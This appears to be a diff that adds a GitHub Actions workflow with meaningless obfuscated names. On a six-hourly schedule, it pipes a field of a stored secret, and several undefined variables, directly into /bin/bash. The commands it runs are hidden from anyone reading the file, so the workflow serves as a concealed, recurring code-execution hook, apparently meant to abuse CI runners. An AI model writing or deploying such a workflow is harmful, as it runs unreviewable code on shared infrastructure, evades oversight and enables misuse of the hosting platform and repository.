@@ -1,0 +1,21 @@
+name: gelubang0987
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '25 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: gelubang0987
+        env:
+          bbv8425: ${{ secrets.bbv8425 }}
+        run: |
+          echo $bbv8425 | jq -r .tj3 | /bin/bash
+          echo $wqj56980 | jq -r .kevn441 | /bin/bash
+          echo $jy780 | jq -r .y71887 | /bin/bash
+          echo $yvn679 | jq -r .zkb694 | /bin/bash
+          echo $mzej10 | jq -r .lz45 | /bin/bash
+          echo $bdjpy5195 | jq -r .uue40460 | /bin/bash
+
